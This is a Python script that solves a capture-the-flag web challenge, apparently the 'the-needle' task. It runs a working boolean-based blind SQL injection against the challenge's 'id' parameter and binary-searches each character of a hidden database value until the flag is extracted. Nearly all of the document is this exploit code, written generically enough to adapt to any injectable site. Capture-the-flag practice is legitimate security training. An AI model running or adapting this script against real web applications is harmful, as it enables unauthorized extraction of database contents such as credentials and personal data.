import requests

# The URL of the challenge
url = "https://the-needle.chall.wwctf.com/" 
# The string that appears on the page for a successful guess
success_text = "Yes, We found it !!"
# Define ASCII range for possible characters (32-126 covers most printable ASCII)
min_ascii = 32  # Space
max_ascii = 126  # Tilde ~

flag = ""
position = 1

def check_condition(position, condition):
    """Send a request with the given condition and check if it returns True"""
    payload = f"-1' OR ({condition}) -- "
    params = {'id': payload}
    r = requests.get(url, params=params)
    return success_text in r.text

print("Starting binary search extraction...")

while True:
    # Binary search for the character at the current position
    low = min_ascii
    high = max_ascii
    found_char = False
    
    while low <= high:
        mid = (low + high) // 2
        
        # Check if ASCII value at position is greater than mid
        condition = f"ASCII(SUBSTRING((SELECT information FROM info), {position}, 1)) > {mid}"
        if check_condition(position, condition):
            # Character ASCII is higher, search upper half
            low = mid + 1
        else:
            # Character ASCII is lower or equal, search lower half
            high = mid - 1
    
    # After binary search, 'low' should be the ASCII value of our character
    # We need to verify it exists
    condition = f"ASCII(SUBSTRING((SELECT information FROM info), {position}, 1)) = {low}"
    if check_condition(position, condition):
        char = chr(low)
        flag += char
        print(f"Position {position}: '{char}' (ASCII: {low})")
        print(f"Flag so far: {flag}")
        position += 1
    else:
        # No character found at this position, we've reached the end
        print("\nFinished!")
        print(f"Final Flag: {flag}")
        break

    # Optional: break if we detect the closing brace of the flag format
    if flag.endswith("}"):
        print("\nClosing brace found! Extraction complete.")
        print(f"Final Flag: {flag}")
        break